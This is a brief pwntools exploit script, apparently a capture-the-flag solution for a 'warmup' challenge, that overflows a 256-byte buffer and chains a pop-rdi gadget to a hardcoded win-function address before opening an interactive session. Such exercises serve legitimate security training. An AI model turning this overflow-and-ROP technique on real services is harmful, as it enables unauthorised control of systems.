from pwn import *
context(log_level='debug')

#p=remote('warmup.ctf.defenit.kr', 3333)
p=process('./warmup', env={'LD_PRELOAD':'./libc.so.6'})
pop_rdi=0x0000000000000af3 #: pop rdi ; ret

win=0x0a14
payload='a'*256
payload+=p64(pop_rdi)
payload+=p64(win)
p.sendline(payload)

p.interactive()

